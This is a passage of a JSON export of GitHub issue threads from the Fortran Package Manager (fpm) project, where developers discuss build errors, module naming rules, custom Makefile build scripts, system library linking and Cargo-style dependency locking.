                    "text": "Hi Brad,\n\noh, I will have to check that - I was rather certain there was nothing like\nthat ... Thanks for looking into this.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 01:26 schreef Brad Richardson <\nnotifications@github.com>:\n\u2026\n Some of the source files contain a program at the end which uses the\n module. This use statement signals to the fpm build system that the module\n depends on itself. Thus, the recursive rule error message.\n\n Basic fix, remove the example programs from the end of the module source\n files.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#126 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRYYYOIWSM7W3KDR5WLR4THA3ANCNFSM4PAASMNA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 09:15:18+00:00",
                    "text": "Yes, two of the source files contained a test program (I should have a look at those :)). But when I removed them and tried again, I ran into another issue: a presumed relation between the names of the module and the source file that contains it. I will report it as a separate issue."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 14:57:56+00:00",
                    "text": "Especially because this (module + program in a source file) is valid, fpm needs to be able to detect this and print a helpful message to the user."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-21 15:03:58+00:00",
                    "text": "Yes, the error message was puzzling. If you know the design decisions\nand usage constraints it is probably easy enough to locate the cause,\nbut for a novice user it will not immediately be clear.\n\nRegards,\n\nArjen\n\nOp di 21 jul. 2020 om 16:58 schreef Milan Curcic <notifications@github.com>:\n\u2026\n\n Especially because this (module + program in a source file) is valid, fpm needs to be able to detect this and print a helpful message to the user.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                }
            ]
        },
        {
            "number": 125,
            "user": "arjenmarkus",
            "date": "2020-07-17 07:42:10+00:00",
            "title": "Not so trivial program: Fortran with a bit of C and a prebuilt library",
            "text": "After this month's call, I looked for a small but not entirely trivial program to try fpm with (not trivial in the sense that it consists of several source files, rather than a single one). I found one that is a trifle more complex than any of the examples I have seen and I would like advice on how to deal with it:\n\nIt consists of several Fortran source files and a single C source file\nSome of the Fortran source files require preprocessing (the extension is .F90, so some compilers will do that automatically)\nThe program needs to be linked to a (C) library that has been installed on the system\n\nThe trivial way I build it is via a bunch of compile commands with the required options, so ultimately that could function as a custom build script, but the above set-up seems a fairly common situation.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-17 19:58:55+00:00",
                    "text": "With current functionality, your only option for this is a custom build script. At some point in the future we'll have the capabilities built into fpm to handle linking to a system library and (hopefully) compiling C code, but we aren't there yet."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-18 14:06:12+00:00",
                    "text": "I understand - I already thought that would be the answer :). Consider it another likely scenario that - at some point in time - needs to be supported.."
                }
            ]
        },
        {
            "number": 124,
            "user": "certik",
            "date": "2020-07-16 22:11:29+00:00",
            "title": "Create the infrastructure for the Fortran version",
            "text": "Per our discussion on the phone call:\n\nUse this repository\ncreate a directory \"fortran\" and \"haskell\" (we can call it differently) and put the haskell version into the \"haskell\" directory and start a Fortran version in the \"fortran\" directory\nUse fpm to build the \"fortran\" directory --- it will be just an fpm package\nEnsure haskell fpm can build it\nReuse the test suite for both haskell and fortran\n\nThis is probably the highest priority issue now so I pinned it.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 18:59:55+00:00",
                    "text": "I think the PR #131 that I just finished fixes this issue."
                }
            ]
        },
        {
            "number": 123,
            "user": "certik",
            "date": "2020-07-16 20:07:51+00:00",
            "title": "Allow to generate a standalone tarball with all dependencies",
            "text": "fpm should have a feature like fpm tarball --include-deps that will create a tarball of the current fpm package together with all dependencies and a build system such as CMake (#69), so that one can unpack this tarball at a machine without internet connection, and build everything from scratch (all the dependencies and the main application).\nThere are many usages of this feature:\n\nan application that must run on an HPC machine without internet connection, and I want to distribute it as a tarball that is built using cmake (a common expectation)\nfpm itself --- we can distribute fpm source code like this, and anybody with cmake can then build it from source (no other dependencies needed)",
            "comments": []
        },
        {
            "number": 122,
            "user": "ivan-pi",
            "date": "2020-07-16 19:20:29+00:00",
            "title": "Have fpm define precision",
            "text": "Recent Fortran language resources usually recommend defining a module with constants defining the precision that are later reused throughout the code, for example:\nmodule precision\n  integer, parameter :: sp = kind(1.0)\n  integer, parameter :: dp = kind(1.0d0)\n  integer, parameter :: wp = dp\nend module\nThese kinds of modules are duplicated throughout libraries. This can potentially lead to incompatibilities, i.e. if library 1 uses single precision as default, and library 2 uses double precision. The user is then faced with the problem of either adapting library 1, or making library 2 use the precision module from library 1.\nWould it make sense to have some mechanism to give fpm the \"power\" of enforcing a certain default precision? Hopefully in the long-term most Fortran programmers would default to just using constants from the stdlib precision module. This might not always be enough (i.e. interfacing with C, or perhaps using fpm on some non x86_64 architectures).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-16 19:25:27+00:00",
                    "text": "Great question. I don't know, I am hoping we will encourage the community to use stdlib to get precision. Fpm has the \"power\" to do anything, but the question is how it would work and if it makes sense. Like the promoting of single precision to double?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-17 09:46:23+00:00",
                    "text": "Yes, the entire situation is kind of messy. I have seen some codes which rely on the compiler flags such as -fdefault-real-8 to automatically upgrade real literals such as 1.0 to double precision.\nIn the Fortran METIS interface I used the C preprocessor:\n#ifdef REAL64\n    integer, parameter, public :: real_t = c_double\n#else\n    integer, parameter, public :: real_t = c_float\n#endif\nto allow users to select the precision depending on the version of METIS installed on their system.\nI think it would be good if we could establish some guidelines for package developers whether such precision choices are responsibility of the package developer or the package user, and whether it should be done by 1) a preprocessor (C, fypp) + build system, or 2) the package manager."
                }
            ]
        },
        {
            "number": 121,
            "user": "MarkWieczorek",
            "date": "2020-07-15 21:46:49+00:00",
            "title": "github dependencies are never updated",
            "text": "One method for downloading dependencies is to specify a github project, and optionally a specific branch, tag, or commit. However, once the entire git project is cloned, it is never updated.\nAn option should be provided to allow to update the dependencies when they change at github. In my opinion, if a specific tag or commit is not specified, the default behavior should in fact be to check for updates automatically.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-15 23:16:10+00:00",
                    "text": "Actually I think we should do it like Cargo --- fpm determines a particular version that satisfies your fpm.toml, and generates fpm.lock. Then it never checks or updates any dependencies, it simply uses fpm.lock which has the exact dependency pinned down. But you can run fpm update command that will update your dependencies (and updates your fpm.lock file). More info:\nhttps://doc.rust-lang.org/cargo/commands/cargo-update.html"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 23:47:29+00:00",
                    "text": "Right now it's not doing anything to check that the version that is there is the right version, that it was cloned and checked-out correctly, etc, just that there is something there.\nWe haven't come up with a coherent strategy for version constraint checking, let alone version constraint solving, so I've just punted on doing anything for now. We'll probably look at what Cargo's solution was.\nThe solution that @certik described is what many (most?) language specific package managers have settled on. It prevents things in your code from breaking randomly because somebody pushed a bug to their repository."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-16 09:27:03+00:00",
                    "text": "A related feature request is the following: Instead of cloning the entire repo, it would be useful in many instances (to speed up the download process) to only do a shallow clone (with git clone --depth=1). I'm not sure what the default beviour should be, but it would be useful to at least have the option."
                }
            ]
        },
        {
            "number": 120,
            "user": "MarkWieczorek",
            "date": "2020-07-14 12:30:13+00:00",
            "title": "\"name\" should not be a required fpm.toml keyword for files that do not link to an fpm library",
            "text": "In the current configuration, it is necessary to specify a name keyword at the top of the fpm.toml file. This name is used to name the directory that contains the .mod, .a, and .o files that are used to generate a static library.\nHowever, if you have a project with only a single file in the app folder, there is no need to have a src folder nor to compile a library at all. In this case, however, if you omit the name keyword, fpm will exit with the error tomland decode error:  Key name is not found\nFurthermore, in my opinion, the name keyword should not be at the head of the file, but should more logically be under the [library] heading, as this is where all the information about the compiled archive is listed. (This would be analogous to name in [[executable]]).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-14 15:48:46+00:00",
                    "text": "If you create a new package with Cargo, say cargo new y, then you get the following Cargo.toml:\n[package]\nname = \"y\"\nversion = \"0.1.0\"\nauthors = [\"Ond\u0159ej \u010cert\u00edk <ondrej@certik.us>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\n\nSo the name is simply the name of the package. Even if it is just a simple executable. So I think the name should stay, it's the name of the project."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:36:06+00:00",
                    "text": "name is used as the default for many things, so you do need it. Otherwise, you'd need to be explicit about everything and likely repeat yourself, which we're trying to avoid for common use cases."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 17:05:03+00:00",
                    "text": "If that is the case, shouldn't\n[[executable]]\nname =\n\nbe set by default to name? If you don't set the executable name, you get a similar error.\nEncountering this project for the first time, it wasn't really obvious what the parameters in the fpm.toml file mean. In addition to this, there is also\n[library]\nsource-dir\n\nwhich is the directory for files used to compile .mod and .a files. However\n[[executabe]]\nsource-dir\n\nCorresponds only to the name of the directory in build/gfortran_debug  where you find the compiled executable."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 18:22:59+00:00",
                    "text": "Yeah, we haven't worked through all of the possible combinations of fpm.toml inputs and under what combinations defaults should work. For example\n[[executable]]\nsource-dir = \"app1\"\nshould probably work with the \"defaults\" for name and main, but\n[[executable]]\nsource-dir = \"app1\"\n\n[[executable]]\nsource-dir = \"app2\"\nwould need to complain about conflicting names for the executables.\nThe documentation almost certainly needs work and clarification."
                }
            ]
        },
        {
            "number": 119,
            "user": "MarkWieczorek",
            "date": "2020-07-14 12:16:41+00:00",
            "title": "Link to precompiled system-wide archives",
            "text": "fpm is great for including external fortran projects as dependencies (typically downloaded at github).\nHowever, it often arises that a fortran project needs to link to an already compiled system-wide archive, such as lapack or fftw. At present, to the best of my knowledge, there is no simple way to link to such files in fpm. It is possible that this might be possible using a Makefile, but that would be non-optimal.\nIdeally, the libraries to link to would be placed in the fpm.toml file,  something like this:\nlink = 'fftw, lapack'",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:13:16+00:00",
                    "text": "This is certainly on our radar. We just haven't gotten to it yet."
                }
            ]
        },
        {
            "number": 118,
            "user": "MarkWieczorek",
            "date": "2020-07-10 21:14:34+00:00",
            "title": "Compile archive using pre-existing Makefile",
            "text": "I have a somewhat complicated archive that is compiled with a pre-existing Makefile, and I would like to make this more accessible to those who might want to use it as a fpm dependency.\nBased on the documentation, I thought that I would just need to specify the name of the Makefile in the fpm.toml file, but this obviously didn't work.\nI think that it would be very useful for fpm to have have the option of simply executing a pre-existing makefile, and then placing the compiled .mod and .a files wherever it is that they are needed. Ideally, this would be specified in the fpm.toml file something like this:\n[library]\nmakefile = \"make all F95=$(FC) DIR=$(BUILD_DIR)\"\n\nAlternatively, given that the .mod and .a files are initially found in the src directory, instead of having the makefile manually move them to $(BUILD_DIR), this could be done by fpm itself after the makefile successfully terminates.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-11 00:33:19+00:00",
                    "text": "We certainly want to try and make migrating existing projects to fpm as easy as possible. The questions that need to be answered to solve this problem are:\n\nHow does fpm figure out how to call the makefile? You're example shows something that might be workable\nHow does fpm figure out where the makefile put the stuff it needs to copy? This one's a bit harder\n\nOn the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands. It's a tad less portable, but a pretty straightforward workaround."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-11 09:40:46+00:00",
                    "text": "On the other hand, you could write a script that manually runs the makefile and does the appropriate copy commands.\n\nIs it possible for fpm to run a script now (without compiling files) ? That would probably work for me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-13 14:45:56+00:00",
                    "text": "@MarkWieczorek, yes. Check out the details here. Let us know if anything is unclear or you get stuck."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-13 20:52:32+00:00",
                    "text": "I am starting to make some progress.\nFirst, it turns out that if you have your own Makefile from a pre-existing project\n[library]\nsource-dir=\"src\"\nbuild-script = \"make all\"\n\nand\n[library]\nsource-dir=\"src\"\nbuild-script = \"Makefile\"\n\ndo not do the same thing. The first example actually does what I want (i.e., just do a make all in shell) but the second seems to try compile my source files using fpm.\nSecond, if you exclude the src-dir line, the following doesn't work as expected:\n[library]\nbuild-script = \"make all\"\n\nThis suprises me, because fpm doesn't need to know where my source files are, given that everything is to be compiled by my pre-existing makefile.\nI think that part of the solution will be to refactor the documentation, and describe what is actually happening with the above commands. It would be very useful to have a section in the documentation describing how to port a pre-existing project to fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-07-13 20:54:57+00:00",
                    "text": "We should have tests for all of the above, then it will at least be clear what is supposed to work."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-13 21:25:29+00:00",
                    "text": "One final thing:\nEverything works when using\nname = \"project\"\n[library]\nsource-dir=\"src\"\nbuild-script=make all F95=$FC\n\nHowever,  fpm build ends with the error/warning\nmake: *** No rule to make target `/path/build/gfortran_debug/project/libproject.a'.  Stop.\n\nThis is because (as stated in the docs) \"Additionally, script will be called with the name of the archive (*.a file) that should be produced as the command line argument.\"\nIs there a way to disable this behavior?"
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 11:52:41+00:00",
                    "text": "I've encountered one final problem, which unfortunately is the most important for me.\nFirst, I can successfully compile my project locally using a pre-existing makefile, as described above. The makefile moves all the .mod and .a files to BUILD_DIR, which is located in the main directory at\ngfortran_debub/project/\n\nHowever, if I try to use my project as a dependency (downloaded from github) in another project, the .mod and .a files are located at\nbuild/dependencies/project/build/gfortran_debug/project/\n\nand the following directory is empty:\nbuild/gfortran_debug/prioject/\n\nWhen building the code that makes use of the dependencies, fpm can no longer find where the dependency .a and .mod files are located.\nDoes anyone have any ideas on how to solve this problem? Obviously the files from build/dependencies/project/build/gfortran_debug/project/ need to be copied to build/gfortran_debug/prioject/, but I don't see how to do this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 16:22:17+00:00",
                    "text": "In your case, I'd recommend using a wrapper script to make doing things properly a bit easier. Something like\n#!/bin/bash\n\nexpected_archive=$1\n\nmake all F95=$FC\ncp where/your/*.mod $BUILD_DIR\ncp where/your/archive.a $expected_archive\nbecause, as you've noticed, the build directory will be different when included as a dependency. If you can, you should try and make use of the FFLAGS environment variable as well, so in the future, projects using yours can try out different compiler flags."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-14 20:09:30+00:00",
                    "text": "That might work, but what would I use as the argument to the script ($1) ?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 22:01:13+00:00",
                    "text": "fpm calls that script with the appropriate argument. So assuming your script is called build_script.sh, your fpm.toml would look like\n...\n[library]\nsource-dir = \"src\" # presumably\nbuild_script = \"build_script.sh\"\n...\nand fpm will call your script (effectively) like\nFC=gfortran FFLAGS=\"-some -flags ...\" BUILD_DIR=\"wherever/fpm/decides\" INCLUDE_DIRS=\"build/thing1 build/package2 ...\" build_script.sh some/where/libpackage.a"
                },
                {
                    "user": "certik",
                    "date": "2020-07-14 22:25:11+00:00",
                    "text": "@everythingfunctional why not pass everything as environment variables?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-14 23:05:22+00:00",
                    "text": "I'm not sure I have a thoroughly compelling answer, but my thinking is along the lines of the following:\n\nWe should conform to common practices in existing build systems\nCommon build commands (or at least the ones I'm used to) are of the form build_script what_I_would_like_built\nA common practice for overriding build parameters is via environment variables\n\nI'd agree it's not the most elegant and consistent design, but if our goal is to make migrating to fpm easier, conforming to existing practices is probably the way to go."
                },
                {
                    "user": "certik",
                    "date": "2020-07-14 23:23:38+00:00",
                    "text": "I would suggest to follow Cargo's approach, and not invent our own conventions.\n\u2026\nOn Tue, Jul 14, 2020, at 5:05 PM, Brad Richardson wrote:\n\n\n I'm not sure I have a thoroughly compelling answer, but my thinking is\n along the lines of the following:\n\n  * We should conform to common practices in existing build systems\n  * Common build commands (or at least the ones I'm used to) are of the\n form `build_script what_I_would_like_built`\n  * A common practice for overriding build parameters is via environment\n variables\n I'd agree it's not the most elegant and consistent design, but if our\n goal is to make migrating to fpm easier, conforming to existing\n practices is probably the way to go.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#118 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWEBAUPZFHBQJ6YSGPTR3TQD7ANCNFSM4OW6ADFA>."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-15 07:47:26+00:00",
                    "text": "some/where/libpackage.a\n\nAnd what about the .mod files?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 18:34:25+00:00",
                    "text": "The mod files need to go in the same place."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 18:41:02+00:00",
                    "text": "I would suggest to follow Cargo's approach, and not invent our own conventions.\n\u2026\nOn Tue, Jul 14, 2020, at 5:05 PM, Brad Richardson wrote: I'm not sure I have a thoroughly compelling answer, but my thinking is along the lines of the following: * We should conform to common practices in existing build systems * Common build commands (or at least the ones I'm used to) are of the form build_script what_I_would_like_built * A common practice for overriding build parameters is via environment variables I'd agree it's not the most elegant and consistent design, but if our goal is to make migrating to fpm easier, conforming to existing practices is probably the way to go. \u2014 You are receiving this because you commented. Reply to this email directly, view it on GitHub <#118 (comment)>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AAAFAWEBAUPZFHBQJ6YSGPTR3TQD7ANCNFSM4OW6ADFA.\n\nI think Cargo's approach is really good, and we should strive for it. In the mean time, we don't yet support using Fortran as a build script, and their approach doesn't support any other custom (or existing) build scripts, like we would (maybe) like to support."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 20:03:47+00:00",
                    "text": "Cargo requires to write Rust code for the script. We should allow other scripts such as Bash or Makefile, as we discussed. But they should be treated exactly the same as the (future) Fortran script (if we decide to allow that, or just require Bash or Makefile).\nThe API is described here:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html\nThe script is run as is (with no arguments) and everything is passed using environment variables:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html#inputs-to-the-build-script\nAnd the outputs are communicated by printing to stdout using the \"cargo:...\" encoding:\nhttps://doc.rust-lang.org/cargo/reference/build-scripts.html#outputs-of-the-build-script\nCan we do the same for fpm?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 21:06:55+00:00",
                    "text": "I think we should move towards Cargo's API design. Then the communication mechanism can be the same for any build script; inputs as environment variables, outputs as prefixed lines on stdout.\nThere is a subtle distinction between Bash, Makefile, and Fortran build scripts though that they aren't treated exactly the same. Fortran must be compiled first, potentially with some dependencies if we're following Cargo's design. Bash scripts are executed directly, and Makefiles must be executed with make.\nI also don't know that this design will make it any easier to transition existing projects to fpm. There is virtually no chance that an existing build system will \"just work\" with this design, but that chance was probably pretty small with my design anyway."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 21:16:43+00:00",
                    "text": "Perfect, thanks. Yes, I agree it won't make it easier for other projects to port, but by using the same design as Rust, at least they don't have to update their build scripts once they port (currently they will have to update the makefile / bash script after we change the API).\nUsing Fortran as a script sound weird at first, but make sense from a multiplatform perspective, as it would run natively on Windows and other platforms, while Bash typically does not run natively, but requires a linux subsystem on Windows. I think that's why Cargo chose Rust as the script."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-15 21:39:52+00:00",
                    "text": "I think that there is a very simple solution for projects that compile with pre-existing makefiles: We just need to define two environment variables.\n\nBUILD_DIR is already defined, and tells where to put the .mod and .a files within the original project. This would either be in the directory build/gfortran_debug/project if you were simply building the project by itself, or in build/dependencies/gfortran_debug/project if you were installing it as a dependency.\nINSTALL_DIR, which is where the contents of BUILD_DIR get copied when the project is installed as a dependency. This corresponds to BUILD_DIR/../../gfortran_debug/project.\n\nIn practice, the makefile would compile all the .mod and .a files in BUILD_DIR, and only if INSTALL_DIR is defined would they then get copied to INSTALL_DIR."
                },
                {
                    "user": "certik",
                    "date": "2020-07-15 23:23:58+00:00",
                    "text": "Something like that. Here is the list of environment variables that Cargo defines:\nhttps://doc.rust-lang.org/cargo/reference/environment-variables.html#environment-variables-cargo-sets-for-build-scripts\nnote that most are prefixed with CARGO_, but some are not. I suspect the ones that are not are due to historical reasons. I very strongly suggest we prefix all our environment variables by FPM_, so it would be FPM_BUILD_DIR and FPM_INSTALL_DIR. The reason is that it is very easy to make complex 3rd party build systems fail if you define an environment variable with a common name like BUILD_DIR or INSTALL_DIR, because the customized 3rd party build system can easily do something different if this variable is defined. By prefixing all variables, we ensure that our environment variables do not clash with user defined variables. It's a good habit to do that, not to pollute the environment namespace."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-15 23:55:50+00:00",
                    "text": "A quick note, BUILD_DIR is always build/<compiler>_<debug_or_release>/project, whether it's building your project standalone or as a dependency. So when building your project as a dependency, the BUILD_DIR is not within your project's directory. Thus, no need for the INSTALL_DIR variable."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2020-07-16 08:48:18+00:00",
                    "text": "Thanks for all the help: I turns out that I was misinterpreting how BUILD_DIR was being set for stand-alone projects and dependencies. (I also made a dumb choice to hardcode the variable build/gfortran_debug/myproject in the makefile for the standalone project). Using\nbuild-script = \"make all F95=$FC LIBPATH=$BUILD_DIR MODPATH=$BUILD_DIR\"\n\nnow works for both cases :) The only thing I need to do to make this work is to be able to link to system-wide libraries.\nOne final question: how do I change debug to release ?"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-29 20:17:34+00:00",
                    "text": "Could the Makefile of stdlib be already used to compile stdlib with fpm?"
                }
            ]
        },
        {
            "number": 117,
            "user": "everythingfunctional",
            "date": "2020-07-08 18:25:48+00:00",
            "title": "Fix bug with case in program source file name.",
            "text": "Fix #116\nI guess up to now nobody had tried using uppercase in the name of their program source file. This fixes it.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-07-11 21:47:28+00:00",
                    "text": "Nice timing. This was vexing me and I had just found the work-around and was going to report the bug.  Guess it is time to update my copy of fpm(1). That raises the question of whether there should be a line to put in the input files indicating what version of fpm(1) was tested with (which might produce a warning) and what version is at (at least) required? \\\nI would change the pathname back to containing uppercase letters but I am  afraid it would confuse anyone attempting to use the repository with an older version of fpm(1), for example.\nI was working on setting up the following for use with fpm(1) when I hit the problem:\n[dependencies]\n M_process      = { git = \"https://github.com/urbanjost/M_process.git\" }\n\nC SUPPORT?\nI see others have mentioned at least supporting C wrappers for use with the intrinsic module ISO_C_BINDING; but unless that is imminent does anyone have an example using a custom build script that does that? I have a bunch of stuff (M_system, M_draw, M_ncurses, ... that has C wrappers or bindings that I wanted to try with fpm(1) but that is a show stopper; whereas STACK has good multi-language support, etc..\nREVIEW?\nI have a bunch of stuff I was trying with fpm(1) so if anyone has time to comment on how I have used (abused?) it so far, M_process and M_time are about done as far as what I was planning on.\nPRETTY PICTURE WANTED?\nAny kind of an image to place on pages that support fpm(1)? A glowing box with light coming out of it with a big \"F\" above the box?  Anyone feeling artistic?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-13 16:05:55+00:00",
                    "text": "@urbanjost , I have an example wrapping a C library here.\nIf I can find some free time I'll try and give your project a look."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-13 18:45:36+00:00",
                    "text": "@certik can you please review this or approve without review? This fix allows some users to build their packages."
                },
                {
                    "user": "certik",
                    "date": "2020-07-13 20:06:53+00:00",
                    "text": "This looks good, the fix is simple and tests pass."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-07-16 01:39:47+00:00",
                    "text": "The C wrapper and Makefile and fpm example project file are great. It was not clear from the documentation I had found so far how to do that. I wil see how far I get in the next few days.  Not knowing how to do this was preventing me from going much further with my fpm experiments."
                }
            ]
        },
        {
            "number": 116,
            "user": "lauvergn",
            "date": "2020-07-08 12:03:45+00:00",
            "title": "fortran main name file",
            "text": "I found an issue related to the name of the main fortran file.\nWhen main.f90 is in the app directory, the executable is created nicely. Part of the fpm.toml file is:\n\n[[executable]]\nname=\"TEST_dnS.x\"\nsource-dir=\"app\"\nmain=\"main.f90\"\n\nHowever, when, I'm using another name (TEST_dnS.f90)\n\n[[executable]]\nname=\"TEST_dnS.x\"\nsource-dir=\"app\"\nmain=\"TEST_dnS.f90\"\n\nI've got some errors:\n\nfpm: Error when running Shake build system:\nat want, called at src/Build.hs:114:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n\nDepends on: build/gfortran_debug/app/TEST_dnS.x\nat need, called at src/Build.hs:120:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nDepends on: build/gfortran_debug/app/test_dns.o\nat &%>, called at src/Build.hs:137:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nDepends on: build/gfortran_debug/app/test_dns.o build/gfortran_debug/app/test_dns.mod\nat undefined, called at src/Build.hs:142:25 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\nat error, called at libraries/base/GHC/Err.hs:78:14 in base:GHC.Err\nRaised the exception:\nPrelude.undefined",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:16:36+00:00",
                    "text": "That looks to me like it's expecting a test_dns module. Perhaps there is a uppercase/lowercase mismatch in the file name? Maybe try deleting the build directory to start fresh?\nI can maybe try and dig deeper later today if none of those work."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 15:24:22+00:00",
                    "text": "Perhaps there is a uppercase/lowercase mismatch in the file name?\n\nI thought about that too, but it is not that.\n\nMaybe try deleting the build directory to start fresh?\n\nI've tried that as well (several times!!)"
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 16:33:34+00:00",
                    "text": "I can maybe try and dig deeper later today if none of those work.\n\nThanks, you can get the full test here:\nhttps://github.com/lauvergn/test-fpm"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 18:18:53+00:00",
                    "text": "Figured out the problem. The build process for the executable isn't handling upper-case vs lower-case correctly for the name of the source file vs the name of the object file. I'll get a fix put together shortly."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 18:21:15+00:00",
                    "text": "Figured out the problem. The build process for the executable isn't handling upper-case vs lower-case correctly for the name of the source file vs the name of the object file. I'll get a fix put together shortly.\n\nThanks"
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-09 12:58:04+00:00",
                    "text": "Thnanks"
                }
            ]
        },
        {
            "number": 115,
            "user": "lauvergn",
            "date": "2020-07-08 07:50:32+00:00",
            "title": "Moving a fpm package structure to another one",
            "text": "In a way, it is not an issue about the actual fpm tool, but something which might be annoying in the future.\nLet assume, you have package with one or several libraries, so the fpm tree is:\n\nsrc/math_constants/\nsrc/phys_constants/\n\nSo a fortran files is math_constants_xxx.f90 and its corresponding module name is math_constants_xxx.\nNow, if one wants to move this structure to a more complex one (or it is taken from another package):\n\nsrc/Util/math_constants/\nsrc/Util/phys_constants/\n\nThen it means, you have to change:\n\nall module names inside the library and also in the other part of the code (much more complex, although with some ide it is doable)\n\nI think fpm needs some tools to perform such features.\nalias gardhor",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-08 15:11:00+00:00",
                    "text": "Yes, we discussed this exact issue in the past and we all agree that fpm should be able to fix up your code when you move files around."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:13:28+00:00",
                    "text": "Yeah, I could definitely see that being a desired refactoring, and it certainly would be a chore to do manually.\nSolving this properly will involve a more complete Fortran parser than we've needed so far. This and other desired features are making it pretty clear that we're going to need one.\nSome thoughts on what the user interface might look like:\n\nfpm move <old-name> <new-name>\nfpm rename <old-name> <new-name>\nMaybe have a separate tool?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-08 15:19:00+00:00",
                    "text": "Actually the API I was thinking of would be:\n\nfpm fix_module_names or something like that, and it would go into each file and ensure the module name corresponds to the path.\n\nBut I can see that fpm move would also be useful to fix all use statements.\nThese are all things that we should do in the Fortran version of fpm."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-08 15:32:49+00:00",
                    "text": "Just an idea. Could it be part of fpm build? Example:\n$ fpm build\n...\n...\nfpm error: I found inconsistent module name in src/a/b/util.f90. Do you want me to fix it? [y/n/a]\n\nSo an error would trigger a prompt from user, which could be overriden with a flag like fpm build --fix-all or similar.\nLike with many other software things, it's a design compromise between many small commands versus fewer more general commands. I don't know what's nicer for the average user."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-08 15:44:12+00:00",
                    "text": "fpm fix_module_names or something like that, and it would go into each file and ensure the module name corresponds to the path.\n\n\nA tool like that will be great also to move (or to help moving) a none-fpm package to a fpm one."
                },
                {
                    "user": "certik",
                    "date": "2020-07-08 15:47:03+00:00",
                    "text": "@milancurcic and @lauvergn yes to both. For fpm build, perhaps with an option fpm build -i (as in interactive), since I think the build should not wait for user input by default, as it would stall on CIs."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-08 15:49:51+00:00",
                    "text": "Yep, I agree. Both of those would also be useful additions. To the extent possible fpm should provide meaningful error messages and help the user fix any problems related to the conventions/restrictions that it imposes."
                }
            ]
        },
        {
            "number": 114,
            "user": "smeskos",
            "date": "2020-07-07 13:05:05+00:00",
            "title": "module naming issue",
            "text": "I found out after a lot of trouble that I couldn't build my project because I had all the modules files in src/ in the form mod_name.f90, when I renamed all files to m_name.f90 and the modules to module m_name respectively, it recognized them all and built successfully.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-07 14:06:09+00:00",
